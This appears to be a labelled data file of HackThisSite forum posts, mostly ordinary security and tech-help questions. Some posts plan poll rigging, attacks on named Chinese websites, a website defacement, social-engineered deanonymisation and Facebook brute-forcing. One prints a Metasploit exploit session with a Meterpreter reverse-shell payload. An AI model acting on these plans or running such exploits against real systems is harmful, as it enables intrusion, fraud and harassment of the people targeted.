1	hacking an online polling system	all, im trying to learn how to hack a polling system.  you make your selection and then input your email address.  it sends you an email with a link to verify your vote, which has a code and your email addy in the url. looking at the source code it seems to be referencing a .js file.  i was able to access that file but cant make sense of what its doing.  i was thinking that if i figure out where its adding the 1 vote for the category, i could localize the file, change the value to something like 3000, then submit a fresh email address through it.  i could post the .js file here if you guys want. anyway, can anyone help me here?  at least point me in the right direction?
1	Looking for a mentor	basically, im looking for a mentor, one that is willing to stick with me in the longer term (i prefer a few lessons at at time spread out over a huge period of time vs. tons of lessons in a small period of time, but stop the lessons fairly soon). here is what i want to learn: how to detect malicious sites. i want to know how i can detect common (and maybe uncommon?) malicious threats that sites have, and also how i can help prevent them from myself. defending my own computer: its been way too often where someone has tried hacking my computer, and ive just sat there praying that avg saves my $4000. i want to know that i can actually do something, and fight to defend it against those people. defense of websites: i just recently got asked to set up a server for them. ive done it plenty of times, but i dont usually hack-proof it. i would like if i had some knowledge of the most common types of site exploits and how to solve them. here is what i have done on hackthissite: 1-9 on basic, all of javascript. i did that in 2 days, without looking up any of the answers. so i hope thats proof enough that i am willing to work hard. what i am/am not looking for: -someone who can teach, not just tell me the answers -someone who is patient, and wont start being an arse if i dont get it right away (hopefully that wont happen too much...) -mature (obviously!) -free....ok, not trying to be an ass, but i dont have any money. many people, myself included love to teach just for the sake of teaching, and would be willing to help for free. reply to this thread if youre interested, and i can give you my contact info. thanks!!!
1	NEED URGENT HELP ! virus/trogen	ok my problem started like this... i had a virus, and or trogen that avg 8.5 picked up and i used the program to delete the file and correct the problems. opon doing so i rebooted and i was immediately prompted to activate windows! so my guese is that i deleted an important system file.... the only file i think that was of importance was the msb file it got deleted. and what really makes no since is that i can boot in safe mode and while trying to activate windows in regular boot up (i cant get to my desktop) it will not except my cod. the cod is the one on the system becuase i used a program in safe mode to check what it was. so why the hell woulnt it activate ... my only consilation is that the activation box has a go to microsoft link wich brings up internet explorer from wich i can get to programs and other websites via the open command....    ok well thats about it i just dont understand whats happening and how to fix it   .... a few things i have tried are undoing the deletes through avg and system restore (in safe mood/ admin) but restore seems to not work everytime just says couldnt restore... please help me
1	Spyware on the rise...	i am writing this topic just for the members who have spyware constantly on there pc, i mean, i had downloaded avg and spyware doctor and i had my firewall turned on, and yet i still had 22 viruses on my pc. error messages about low system memory and so on so forth continuously flooded my pc, spyware redirected every website i visited... it was utter chaos.  this is a quick, not very amazing, easy list of what to do to protect from spyware: 1. download an anti spyware program, such as avg, or spybot s&d 2. never work online while a firewall is turned off. 3. use a secure web browser, i suggest google chrome or firefox 4. make sure that you delete unknown cookies, as these could be tracker cookies. 5. make sure that windows defender is updated regularly, although defender is a slow and annoying program.. 6. just use a program that tells you what sites are safe and a program that doesnt allow unsecure downloads to initiate 7. some websites upon loading automatically download a file onto your pc, make sure you do not click accept. 8. disable pop ups, this really doesnt protect you from viruses, but stops irritationg windows... i know that the list isnt exactly amazing. but it was a quick one, and i have learnt from alot of mistakes. if you need any help how about you pm me. ill be happy to help. and do any of you reccomend any programs for antispyware or antivirus, and what do you use altogether, browser, programs, etc...

1	Password retrival problem.	im having a problem accessing my account (not this one obviously, i made this one so i could access the forums). i forgot my password, which would be easy enough to fix except for one thing: the email sent to me by the lost your password link arrives ok but when i click the link in the email it takes me to a page on hts saying the link is invalid. ( http://www.hackthissite.org/user/resetp ... 32af474f95 ) any suggestions/help would be much appreciated. (the account im trying to access has the username shnuce, if an admin could reset the password that would be perfect. if you need confermation that it actually is my account just get in touch via the email address registered to it.)
3	IRC	"im about to try at the irc missions, but i dont know shit about irc. i know the basics, but thats about it. i was wondering a few things before i went there and exposed myself to the elements...  is it easier to get hacked there?  this is what worries me the most. i dont have a host mask(im waiting on one from freenode) and my ip is just hanging out there for everyone to see.    which leads me to my next question,  can i use tor to cloak myself on your channel? some channels dont allow it.. and it seems we have to connect from the site, but i dont know i havent been there yet..?  and the final  question, ""does any one know any ""specific"" eb00x i can read to get more familiar with irc(please no seafch engine posts im well aware of google, etc) scripting and such...i have eb00x about botnets, etc, but thats beyond my irc knowledge right now."
3	Ideas on Complexity Theory P=NP problem	p=np? for those who dont know the p=np problem, it is a big conjecture of computer science in complexity theory these days.  the p stands for  set of all polynomial run-time algorithms and np stands for set of all non-polynomial run-time algorithms.  examples p = {selection sort, radix sort, binary search, ... , inserting a node in a binary tree} np = {solving sudoku, minesweeper problem, traveling sales person, ... , 8 queens problem} not completely sure if these sets are finite sets:) problem prove p = np or p != np   for the official declaration of problem check the following link http://www.claymath.org/millennium/p_vs_np/official_problem_description.pdf to this day no one has been able to prove either or, and is an open important topic of today.  it is such an important problem that if anyone can prove this then they will win an award of 1 million dollars!!! other incentives to solve p=np.... well if it can be shown that p=np then encryptions thought to take 20,000 years to crack now suddenly take 2 seconds to crack.  this will revolutionize the way we compute data.  it is thought that we might be ahead of our time alittle and need to change electrical components making up circuitry.  anyone here of the memrister that will be coming soon?  my thoughts well sofar i know since p and np are both sets then to show that p=np, one must show that p is a subset of np and that np is a subset of p.  if anyone can find a way to determine how long an algorithm will take to solve any np problem then youve shown that np is a subset of p. if we had a simple bubble sort forexample it runs in o(n^2), which is the max bound of the expected run-time for a data of length n to sort.  well ok now lets say we have a sudoku board a 9x9 board with 9 3x3 grids within.  there are 81 total blocks and with some simple combinatorics we get 9^81 maximum number of brute force possible during the algorithm run. we know that 1 <= #comparisons <= 9^81.  thats all im saying for now unless this thread turns out good.   i could be on the wrong direction, but just my thoughts on this problem. anyone else think about this problem occasionally here?  got any ideas?
3	Bacteria(Theory) & Malware	"terms introduction the bacteria idea. now since i am not a master in programming and computers science. i will also use my knowledge in biology. a virus basically is: an organism(entity) which requires a host to reproduce. they are dependant of the host resources and use them to a point of being a risk to the host. they change the host to satisfy its needs including reproduction. (dont apply to biology)they are intended to cause solely damage or annoyance to a user. now bacteria: does not reproduce at the same way as viruses 99% of known bacteria is beneficial to humans or at least harmless. now, in this thread we will only make one addition to the bacteria definition: kill malware. and change ""does not reproduce at the same way as viruses"" to ""is hosted by volunteers and are design to self eliminate themselves after completing a programmed task without further reproduction"" how my theoretical bacteria works: it uses volunteered computers to scan. it scans the networks for malware if it finds malware it offers the information to the user over the network if it finds malware it offers help but does not stay or uses that computer for reproduction it will consist of 2 parts: the farm(a crawler&spider). scans networks for malware. the bacteria. each one design to eliminate computer malware and eliminate itself after completing its task. in some cases fix vulnerabilities and exploits if requested by the user. what this thread is about: is this technology useful? is this technology beneficial? is this technology ethical? is this technology moral/legal? msg to mods. please, if i post in the wrong section move it."
1	apologies	please accept my apologies for my earlier post. i guess, what i was trying to say was, are there any specific tools i could use to alter data on a website game? looking for something that could change statistics like health, bullets, money....that sort of thing. i dont actually want to hack the website inasmuch as to obtain anyones password
1	windows defender virus	ok,so...a couple of weeks ago my pc <running on xp> got this nasty virus while i was trying to download a couple of things,basically what it did was make a shitload of popups telling you you need to install windows pc defender or something like that,i tried everything superantispyware,avast,avg,mcaffee,adaware,spybot search and destroy,and a bunch of other things,couldnt get rid of it...it was so nasty it even deleted my system restoring back up drive,so i installed a fresh xp.works fine but,i got no sound what so ever i tried anything you can do with the drivers,codecs,regestry,ect. any ideas how to get my sound back? friend of mine said something about a rootkit,dunno what that is or how it would still be on my pc...
1	Missions on a MAC?	hi guys, i was trying to do some of the missions which went quite well, only i got stuck on mission 4 (send password to email) as i do not seem to be able to take a small part of the html and change the email address, so that when i open it it opens as an internet page. i use a mac, and i can only open it again in text edit, while seeing the html code, rather then it running the code. any suggestions? thanks!
3	Real Life Problems	hi guys! i have little experience with actual hacking (besides this site) and i was wondering if any of you know any place / problem on the internet, computer, etc where i could actually practice my hacking skills a bit? maybe i could try to hack my own email account? or some website set up for this purpose? anything you could tell me would be greatly appreciated!     thanks in advance!
2	well have you guys heard this news in China?	"so you guys thinks that we chinese people likes to hack right? well now the chinese hackers went to far, on june 9, 2010, they conducted a cyber warfare known as the ""69 jihad"" or ""69 holy war"", original text is ""69圣战“ here is articles in english about this: http://www.chinahush.com/2010/06/11/69- ... -pop-fans/ http://blogs.wsj.com/chinarealtime/2010 ... /comments/ and believe it or not, i need a hacker alliance to stop them. although that day had passed, but these dumbfucks had not stopped their stupid actions against the fans, i understand what the fans did was wrong, the fans were immature to start this, but i believe what these guys did was also wrong. here is what they did: on that day, about 3 million chinese holy war hackers were gathered in one command channel, then at 2pm, they started the spamming and flooding on many korean celebirties websites and fans websites, they even attacked korean government websites. they are doing it in the name of motherland, they did it because they ""love"" their country, but i believe they didnt reach that goal, instead it will bring more hatred toward chinese people from foreigners. this is also the reason why i registered this forum, i need to gather an international hacker alliance and hack chinese websites that are involved in the ""holy war"", i want to show them what a true chinese would do if he or she loves his/her motherland, is too stop everything that will damage his/her motherlands international pride. our main target: baidu tieba wow forum http://tieba.baidu.com/f?kw=wow&fr=tb0_search&ie=utf-8 this is where this whole war started, a bunch of bored people want to make a big scene out of nothing, this is our first attack target!!! and the remaining target is all the site that related with this cyber war, but right now thing are calming down it looks like, but i still see many conflicts going on between the fans and the holy war warriors, the fanss websites are our targets too, we need to tell them to stop this nonsense by apologize to the armed police (that is what the holy warriors originally intended to do at first, but now it is a cyber war) both sides are at fault, and dont worry, ask me for chinese translation help, in return for you guys help, i will stay in this forum and learn all about hacking and communicate with you guys and make friends"
3	Hilarious IRC Conversation	this conversation took place on a different server i visit, regardless of where it took place, it is still hilarious. i understand that this is more than 20 lines, but come on? just read it before you edit/close the thread. <zerocool> i have something of relevance that youre going to need to see. <mirage> i really dont think i need to see it. <zerocool> anyways, gonna go ahead and show it to you. <zerocool>  http://i50.tinypic.com/x4kwf4.jpg <mirage> what the ****. <mirage> did you draw this? <zerocool> uhhh those are dinosaurs in submarines in space. <zerocool> see how he just exited hyperspace? <mirage> thats hyperspace? <mirage> you got some hyperspace up in there. <zerocool> yea. <mirage> why isnt the dinosaur inside the ****ing submarine? <zerocool> he got out of the submarine to survey his surroundings. <mirage> seems like he couldve just done that from the window. <zerocool> the windows are tinted. <mirage> who the **** tints windows from the inside? <zerocool> youd have to ask him that. <mirage> you want me to ask the dinosaur that you clearly cut and pasted onto a submarine? <zerocool> do not doubt the dinospacesubcraft. <mirage> is that what you call that? <zerocool> thats what he calls it. <mirage> i call it bullshit. <mirage> what kind of dinosaur is that. <zerocool> probably a raptor. <zerocool> looks kinda like a raptor. <mirage>  http://www.blavish.com/wp-content/up...11-16-2006.jpg <mirage> wanna explain that? <zerocool> that doesnt even look like the dinospacesub craft. <mirage> no? <zerocool> yea. <mirage> looks pretty similar. <zerocool> it looks completely different. <mirage> looks like you stretched that picture. <zerocool> i did not stretch that picture. <mirage> pretty sure you stretched that picture. <zerocool> no, that is a picture of the guardians of deepspace. <mirage> i dont think dinosaurs guard deep space. <zerocool> im actually 110% certain th at dinosaurs guard deep space. <mirage> its highly improbably at best. <zerocool> thats definitely a guardian of deep space right there. <mirage> yea? <zerocool> yea, he looks kinda vicious. <mirage> the hyperspace rainbow looks kinda gay. <zerocool> nah, thats just what hyperspace does. <zerocool> look at him, he even looks like hes guarding something. <mirage> yea? <zerocool> this is irrefutable evidence of the exitence of dinosaurs as the guardians of deep space. <mirage> looks like some ******* cut and paste a dinosaur onto a picture of a submarine. <zerocool> i did not cut and paste a dinosaur onto a picture of a submarine. <mirage> im pretty sure you did that. <zerocool> nope. <mirage> where did you get the ****ing raptor from? <zerocool> that picture is genuine. <mirage> hes not even in the submarine. <mirage> its like you didnt even try. <zerocool> hes on his dinospacesubcraft. <mirage> im going to report this picture.
1	Javascript for beginers	"im a long way off before i get on to the javascrpt missions, but... i picked up a book (for free) javascript a beginers guide 3rd edition by john pollock on first glance it seems a decent read and there are some practice ""missions"" in it and a self test quiz at the end of each chapter. just wondering what people thought of this book ? if anyone has came accross it that is. probably available in your school/college/uni/local library, might be worth a look for those just starting in to the javascript missions."
1	Windows 7 - Avira update issues	"hi! didnt know where this would actually go but, it seems, this thread would be best for this topic. so, i installed windows 7 on my new laptop about two weeks ago and used a loader to activate it. then, i installed the avira av. everything was fine until a few days ago, i now cannot get avira to update. i also noticed that im getting admin related issues on other programs.  ie. i cant run some programs without using the ""run as administrator"" option when, in fact, im already on an administrator account on this computer. i usually get an error message.  hmm..apparently, it doesnt do that anymore. no idea how that got fixed.  but my main concern is getting avira to update. it says ""error in downloading file"". any ideas? -- thu aug 12, 2010 2:16 am -- wow. this is freaking me out. now, i cant start avira altogether. it just stays there. stopped. could i possibly have malware on my computer right now? i mean, i went through a whole barrage of ""how to secure your computer"" lists about a week ago and none of the security software detected anything. bit defender doesnt detect anything, at all.  help"
1	Trouble Browsing HTS Help Please!!!	when i browse hts it gives me endless errors and redirect loops. ive disabled third party cookies, cleared my cache history and cookies, changed ref control so i dont have an empty referer and tried using diffirent proxies. ive had most success so far when using the onion router tor, but as soon as my ip switches, which is like every five minutes, i have to relog.  the errors im getting are: this page is redirecting in a way that will never end, or something like that, invalid referer and sometimes it just redirects to the main page and logs out by itself. this is really anoying. someone said i should type in about:config in the address bar and reset the values on network.http.send...on two settings but this only worked for a short while. i switched over to backtrack 4 and ubuntu maverick and after a while i got the same errors on firefox as i got on windows. ive also tried using chrome,changed the cookie settings and it worked for a while but i had to keep clearing my data, and chrome doesnt have the cool plugins that firefox had.  am i just stupid?
3	An ethical dilema?	"i have decided to share this particular dilema in these forums as it is the most likely place to get solid advice from someone who has been in the same situation as i am. here is a short synopsis of the issue. i work for a reasonably small computer buisness and one of the services we offer is website security checks. long story short a local ""charitable"" buisness manager came in and asked for a website check as soon as possible as their website was just up and running etc. as i was the only person available at the time (i am fairly new to the job and usually someone more senior does the security checks in case of sensitive information leak) i was set to the task of ensuring their website wasnt a total shambles. this is where we reach the ethical dilema, unfortunately (for them) their website was incredibly vulnerable meaning i was able to get easy access to their admin account. within this account i found several financial documents which heavily suggested funds they were receiving were not being used for charitable purposes. the question is, do i disclose my findings to the appropriate governing bodies bearing in mind the buisness i work for guarantees confidentiality?  of course the simple answer is just to report my findings to my senior and walk away from it all, however, if i do this i am 99% certain nothing will be done about this and lets face it, they are scamming ordinary people out of hundreds (and even thousands i noted) of charitable donations. so, thanks if you read it all, anybody care to offer some advice?"

"i have googled everywhere and only find articles about installing bt4 on a vm with windows, i need to know how to install virtual machine on bt4 to run windows as a vm within bt4. i know it is based on ubuntu and need to install dkms, because that is the error i get when trying to run the windows vm within bt4. i did a ""apt-get install dkms"" because i read a article about installing virtual machine ose on ubuntu and others having that error but when i do that command on bt4 is says ""reading package lists... done building dependency tree reading state information... done some packages could not be installed. this may mean that you have requested an impossible situation or if you are using the unstable distribution that some required packages have not yet been created or been moved out of incoming. since you only requested a single operation it is extremely likely that the package is simply not installable and a bug report against that package should be filed. the following information may help to resolve the situation: the following packages have unmet dependencies: dkms: depends: linux-headers but it is not installable e: broken packages"" has anyone used virtual box on bt4? how did you get it too work? thanks -- sat oct 02, 2010 10:45 am -- anybody please!!!!"
1	Adopt a noob program	"lets face it. the learning curb it takes to go from script kiddie to l33t hacker is almost an impossible leap. most people get frustrated and quit before the real hacking even begins! my idea may take a leap of faith here, but i know that a lot, if not most, aspiring hackers would like hands on training, as well as learning from the immense amount of resources on the internet. the thing is, when most noobs get stuck, they dont know what theyre stuck on and dont know how to research the problem. that is where the ""adopt a noob"" program comes in. the advanced hackers on this website ""adopt"" the noobs that really want to learn. once the noob shows his new ""mentor"" that he is really willing to learn, the mentor guides him/her in all the right directions, and assigns him (legal) tasks to do to show that he/she is really advancing. this should be done only when the mentor has the time, and the mentor has full control of how they communicate with their adopted hacker (im, email, pms, etc..) and the times in which they communicate. i would love to be a mentor if you really consider this idea, but sadly i am only a noob. i would definitely be first on the list to be adopted though!"
3	Best Linux Distro?	"for years, the question has come up.  it exists across all technology forums of all languages.  that question is: ""what is the best linux distro to use?"" the answers vary.  you might hear ""slackware"" from an old-time linux hacker.  a friendly user might recommend ubuntu for first-tmers.  the elitist bastards will tell you to switch to bsd.  you might get a fanboy telling you to stick with the newest release of windows or mac.  but whatever the answer, they are all wrong. my friends, today i have found the answer to this age-old question.  no longer do we have to fumble around with questions, trying to figure out a perfect fit.  no longer do we have to argue amongst ourselves, creating splits and loathing.  no longer must we nit-pick at the nuances of this or that distro... i reveal to you:   the best linux distro evar"
1	Hotmail Vulnerabilities. Help as I was hacked!	hey guys, a couple of days ago myself and a couple of mates went on a fishing trip and in some random conversation my friend found out my secret password for my secret question for hotmail. he then went on to hack my facebook/battlenet/steam accounts but then gave them back after he had his lols. after this, i changed all my passwords/secret answer and told him that he wouldnt be able to get into it again. he did however...and this guy has only been learning web based stuff for like 2 weeks. im assuming he was figuring out how to hack a hotmail account after you have gotten in once without needing the password/secret answer ever again. how would he have done this? he did make his own site and i have looked up some stuff about xss and sql injection although i cant quite fit the pieces together.  any help on this matter would be great and if anyone knows of a free alternative which is secure to hotmail, that would be great too. i dont want to change to another email though which just has ssl as they can be hacked in very much the same way. thanks, hiyoal
1	Cain expeirenced user please read.	so i recently downloaded cain and abel and i need to know how to use it properly in regards to getting a password from a website ((if thats even what it does)). to be honest, and a total noob, the interface is a bit menacing. i cant seem to understand the procedures i need to take to get the program up and finding the information i need. im trying to understand the tool a bit better so i can complete realistic 5, but as i said, its a bit menacing and frankly i just dont get it. any and all help will be greatly appreciated sincerely, --aeos
1	Finding fingerprints of hacker	since i was in college i havent had much time so i havent edited my site or logged into the server for a year. i went on my site today and noticed directory browsing is now enabled for some reason. i checked the .htaccess file and noticed  options -indexes  was commented out. i never touched this .htaccess file since i had the server, i cant remember if it was there when i got the server or not. directory browsing cant just turn itself on can it? is this evidence that someones edited that .htaccess file?  i dont know a whole lot about web servers, what signs should i look out for that someone has access to it? i checked the ftp access logs and theres nothing unusual in them but any hacker would edit that. i noticed the access-logs folder has 777 file permissions. is that unusual? i only noticed it because theres a little symbol filezilla puts on it to show its 777. ive never seen that symbol before so unless thats a new feature of filezilla, the file permissions of that folder and www folder were changed at some point but not by me. can anyone recommend some things to look for to try and determine whether the server has been hacked or not?
1	new to this help with brutus please	hi iam very very new to this,i always thought u had to be a master genius on a comp to be able to hack, i know the early stages of the tutorials are easy  i was amazed at what i learned from doing them ive done basic 1-5 and realistic 1 and 2 since yesterday . i read something somewhere about brutus password cracker ive just started using it im trying it on my facebook but it doesnt seem to work im sure i have it set up the right way but im now wondering if facebook can be done with brutus.im checking to see because im sure my facebook was hacked there has been links sent to my friends from me but i didnt send them this is how i have it set up target   facebook.com      type  pop3 port 110          conections 20    timeout 10 my user id     pass mode bruteforce  lowercase alpha  range 10-10  is this right
3	I challenge you	"hi, i am new to this site, and i dont even know if im posting this in the right category. but to keep the story short, i need help. more precisely, my friend needs help. like, really bad. were both students engineering and for our studies we need a laptop. i can say its hardly possible to do without. but yesterday his laptop got stolen in the train. i searched for all possible ways to trace a laptop, but i dont know much about computers... he didnt install some tracing program like prey, so the situation is really bad. what we do have, is a licensed version of ""siemens nx"" and i heard that the makers of the program can trace your computer if you use an illegal version (ours is legel) so i thought there might be a chance its possible. i also know that if the thief formats the entire laptop, everything is lost, but if there is even a small chance that he doesnt and he goes on the internet,... therefore, im in search of people who arent afraid of a challenge and know a lot about computers. i am very upset about the theft and think its very low of the person to just take something that doesnt belong to him. therefore i tried to help my friend in every way possible, but im not a genius when it comes to computers...  so if there is anyone willing to help me, please contact me.  im also aware that there is a chance that no person here can help me and that im making a total fool out of myself, but im gladly taking that risk because i care deeply for my friend and hes had enough problems already. anchsena"
1	Hacking related question...	lets say i knew an ethical hacker that i wanted to hire to do a penetration test, but trust was an issue. could i duplicate my system but have its sensitive data removed, and have it untraceable to the company that owns it? if just the structure and security measures remained, could this duplicate be hacked to see if certain areas can be accessed? im guessing it could be put up on some site just like the so called, missions. i could then be informed of the exploits. what would the test site look like? could it actually be completely untraceable?
1	Metasploit error	"so i just started using metasploit today, and set-up my laptop (running win 7) to test some exploits, for learning purposes of course.     i went over and disabled all of the firewalls (including windows firewall) and avs i have on that computer.  i then went over to my desktop (also running win7) and started using metasploit.  but when i tried to run an exploit, it says ""exploit exception: the connection was refused by the remote host (192.168.33.1:1755)"".  thinking i missed an av or firewall i went over and checked, but it appears that all are disabled... im perplexed to say the least.  heres exactly what i did in metasploit: code:  select all msf > use windows/mmsp/ms10_025_wmss_connect_funnel msf exploit(ms10_25_wmss_connect_funnel) > set rhost 192.168.33.115 rhost => 192.168.33.115 msf exploit(ms10_25_wmss_connect_funnel) > set lhost 192.168.33.101 lhost => 192.168.33.101 msf exploit(ms10_25_wmss_connect_funnel) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf exploit(ms10_25_wmss_connect_funnel) > exploit [*] started reverse handler on 192.168.33.101:4444 [-] exploit exception: the connection was refused by the remote host (192.168.33.115:1755) [*]exploit compleated: no session was started thanks for any and all help!"
1	"""Hypothetical"" website hack problem"	"""hypothetically"" if i were planning on changing a website that i gained admin panel access on so that it gets redirected every time someone visits there site to a new html page i create and upload into their system. say i mistakenly(and very stupidly) logged into the admin panel directly without using a proxy so my ip was proably logged and time stamped somewhere on their servers  if i did go through with it how likely is it that they would be able to trace it back to me?"

1	Poll - Currency Exchange Forum	i make no secret that i have an account on hackforums.  i like to help out those who deserve it, and flame the rest.  also, you can make a quick buck off of the idiots there, but i digress. one thing i did like was their currency exchange sub-forum.  basically people have money in different online accounts (libertyreserve, paypal, alertpay, webmoney, bitcoin, etc.) and they need to trade between them.  since there is no way to send money directly from one to another, they need to find people willing to trade. basically im trying to gauge the interest in such a sub-forum for hts.  if enough people would use it, i would like to have a place where people can feel safe (aka not getting scammed) while exchanging.  basic rules would be as follows: 1.)  there would be some limit on who can trade.  post count?  join date?  invite-only? 2.)  any scamming will result in an immediate perma-ban, no questions asked. 3.)  not a strict rule, but lets try to keep the trading here 1:1 and fair. i dont like the idea of having to use an escrow system, but thats not out of the question as of now.  this exchange service might also take the form of an irc room with an accompanying bot, to allow for searches on type, amount, user, etc. comments?  questions?  concerns?
1	Hacking attack	hi all, i think you could helep me with an answer to a question.a friend of mine thinks that he was a victim of a hacker, because when he is on messenger someone is typing instead of him, his mouse cursol is runing crazy on his desktop and someone has add him on messenger and say to him that he has been hacked.the problem is that he formated his hard disk but still the same problem after that, that hacker keep entering in his computer, he has firewall on, he has an antivirus but nothing cant stop that hacker, could some one help me to tell him what to do?thaks a lot, and sorry if i posted in the wrong category.
1	Trouble With My IP	"i am a dial-up user and my isp uses the same ip for all dial-up subscribers. so when one subscriber  (and there are hundreds/thousands subscribers) is infected by a virus or is malicious, the ip is blacklisted in cbl (and other lists of the sort). this has never been a problem except for irc. i first tried to join hts irc 2 years ago but this blacklisting gave me a hard time so i gave up. occasionally through out the 2 yrs id try and find the blacklist and quit. this week (by some miracle), it finally went through. ive been online for a couple of days, and now ive been blacklisted again. ive delisted the ip and in an hour or two i might be able to sign back it. however, i know soon enough it will be blacklisted and cbl will stop delisting it. what can you do to help me on this? is it possible for you to ""whitelist"" my ip? i want to know that if i may never use irc again until i move from dial-up. thanks."

1	Im A Pirate (Not Really)	hey guys, i was searching through a website that i heard about, and thought i could look for things in another language. so i did. i put in some text in another language that doesnt utilize the latin alphabet and got this  ... now, i dont know much about mysql (understatement of the month) and so i was wondering if any of you guys understand what this means. i wasnt trying to hack or perform anything else except do a search. so... yeah...  any of you guys know this? id love to know.  thanks, s
2	Viruses... Because Im An Idiot.	"hey guys, i... am in a pinch.  heres the story: my mother sent me a link on facebook. it was a tinyurl link to somewhere and she told me to play the video the link would direct me to. so i clicked on the link and found a website that took on the image of youtube. i found on where the video was supposed to be, a link to upgrade my flash player. at first, i thought it was normal and clicked on it. it downloaded normally, no problems here. but when i tried to open the .exe file, it said ""access denied"" (or something like that). i looked back at the downloads, and found that this flash player came from an ip address rather than a website, which seemed odd to me. also, i looked back at the website and it showed that video ""screen"" wasnt normal. instead of the regular grey and light grey image with a connecting piece that says to upgrade your flash player, this was just black and only had the ""link"" to upgrade. this is when i learned ive been duped.  and when i tried to run a virus scan, it stopped before finishing and the computer shut down. then it rebooted, shut down, rebooted, and shut down again. im not sure what the point to that was, but i was annoying. i managed to shut down the computer without having it reboot and went to the store, hoping i could just wait out whatever was there.  so now, i tried to log back into my facebook, and grab the link so i could place it here and hopefully have you guys examine it. it didnt work. the site now says its experiencing technical problems.  also, i keep getting alerts that potentially harmful software is on my computer. ive tried to get rid of it for a while and it wont go away. im thinking i may have to do a system restore to yesterday to get rid of it. any suggestions?  also, im probably being paranoid here, but do you guys know how to check for keyloggers? any advice would be helpful. thanks, s"
1	Getting the most performance out of Centos6	i just recently went all out with the lint in my pockets and purchased a dedicated server using centos6.  a xeon quad core  3.2ghz with 8gb ram.   i was wondering if anyone had any suggestions for optimizing it for performance, especially for its primary function of hosting game servers and secondary function of hosting lamp. i guess to be more specific, with only ssh access (no remote desktop or such) is there anyway to oc the cpu, create a ramdrive, etc..  things you might do to make this puppy run better than its stock setup.  what processes at startup that need to be eliminated.. etc. ive already shut of selinux... its supposedly an important security feature, but to me it looked like all it did was eat up system resouces, and gave me hell trying to setup vsftp and lamp with some vhosts.  whats your opinion on selinux for this application?
1	Facebook Tracking	put down the ban hammer for now  , im not about to ask how to h4ck into facebook servers or trace ip addresses over command prompt. i am looking to verify an identity of an unknown individual who has been saying some rather childish things over facebook. it is almost certain this individual is inside my school which i attend. long story short, im bored and i was thinking about how it could be possible to find the identity of this person. i disregarded some methods: trojans, router mac address lookup (courtesy of our friend google   ) and ip addresses as either illegal, unsuitable or just inaccurate. while thinking about the problem i remembered this site  http://panopticlick.eff.org/  and it got me thinking, what if i setup a website on a free web host and sed this person to click my link, i can then fingerprint his browser and, hopefully add a normal cookie and a flash cookie to his browser. assuming he/she has a fake facebook account its likely they also have a legit account. i could then send out another link to my top suspects to my website that checks for the coookie/ip/browser fingerprinting i have planted and if they match i will have proof on who it is. for my code i plan to make use of  http://browserspy.dk/  if you want to hit it up. and if anyone else knew about something similar let me know. i would like to know if you guys can improve upon this, i take it that if people visit my website more than once i could quickly loose track of who is connecting. any ideas on stopping a double count? unique cookie for each person? but that can still mean if enough people connect to my server i will still loose track of the identity of people. lastly how close is this to the legal line? website routinely profile browsers over many pages, but would social engineering people to click my link via false representation be classed as illegal? if i am to attempt this i would like it to all be above board  tl;dr in case you didnt want to listen to my ramblings any ideas on how to improve browser fingerprinting accuracy in order to ascertain the identity of an unknown person inside a select group of people all who communicate over facebook, and what legal lines should i consider? i would rather not contact facebook admins, i dont really care about what he has posted i just see this as a way to test out a theory on online privacy

3	SecSite - 302 Mystery	"target: a website that offers security services. i know from a source that one of the persons who works there is a real hacker with who once hacked a gov site so maybe they are proffessional. story:  when i was using havij to find the admin page to a website, it gave me 302 responses on every try. ofc they were all false and when i tried them in a browser i got 402 as pageresult.  i wonder how this could be?   clues:  i know that they uses mysql on port 3306 - that is the only clue i have. they dont have any ports open except 21 an 80. but they do use 443 for https. nmap aggressive os guesses that they use openbsd 4.""x"" and says that 996 ports are filtered. i dont know how to interpret that?"
3	Setting up a Sandbox	so, im not sure if this is a thing or not, but do any of you setup sandboxes for development? particularly in web development. its just that, i mostly work with php and whenever i try to test new stuff, small stuff (ie. an algorithm or a new plugin), i put it in a separate local virtual host i use just for testing. problem is, it gets cluttered real fast and just doesnt feel right. i was wondering if theres a better way for doing this.  also, on a different but related note, when you start building new sites do you create separate vhosts as well? i mean it seems to be the best option, but ive never really asked anyone or dug deep enough into the topic to know for sure.  so im starting now, im pretty sure hts members have some good tips to offer.  also also, been awhile. wadup?

1	Complying to password policy in windows based setup - Need h	i want to assure the compliance of password policy in my office. environment intro my environment is all windows based (server 2003/2008) users strength is not more than 400 employees. nearly 90% of all users have windows xp o/s installed on their machines the other 10% population is divided between vista and windows 7 operating systems. the maximum strength for password is limited to 10 characters. problem statement i want to know the easiest, fastest and the most reliable way of enumerating windows users account. i have downloaded and gone through the use of many password auditing tools (l0phtcrack, ophtcrack,samsinde). objectives i want an approach which enables me to enumerate the user account by logging into domain controller and not having to go to each individual machine and then run the software. this activity just creates un-necessary administrative workload. additionally, i need a software that doesn’t require booting into alternate os (as in case of ophtcrack) doing so would affect the performance of the users and also becomes annoying. i want to make use of rainbow tables. the specs handed to me are not enough for me to carry exhaustive brute force attack in the time that is given to me by the senior management to complete the task. however, i got no issue regarding storage-i can dedicate as much as 1 tb for storing rainbow tables. i would appreciate if you guys can provide me with the suitable link and guide me about the things i should consider before downloading such large size files for my use. update: i said in the opening statement of this thread too but i guess i over simplified it. let me re-explain. i want to check for password strength of windows users not standalone. those connected to windows environment. i also want to incorporate use of rainbow tables in the exercise. how can i do this task with information provided above

1	Tracking stolen laptop?	my father recently had his laptop stolen and didnt have any tracking software. since im the only one in the family who knows how computers work (well, sort of) , he asked me if i knew of any way i could help. unfortunately, im actually dismal with anything that isnt java, which im assuming is useless in this scenario. i was wondering if anyone knows if theres a way to track it and find the people who stole it - i know that your ip address changes when you change networks, but i was thinking maybe if he had cookies enabled to automatically login upon opening websites then do you think that our isp could give a list of recent ip addresses that accessed (accidentally) any online accounts of his? i dont plan on doing anything malicious, i just want to find the laptop. also, i live in a country where all the criminals are idiots. theyre not people trying to earn quick cash, theyre a result of lack of education, poverty etc (quite sad really), so i wouldnt expect them to do anything vaguely complex to erase traces of it being stolen. any help would be greatly appreciated, and if this sounds a bit too vigilante or illegal then i offer an apology to the moderators.

1	Hacking a game.

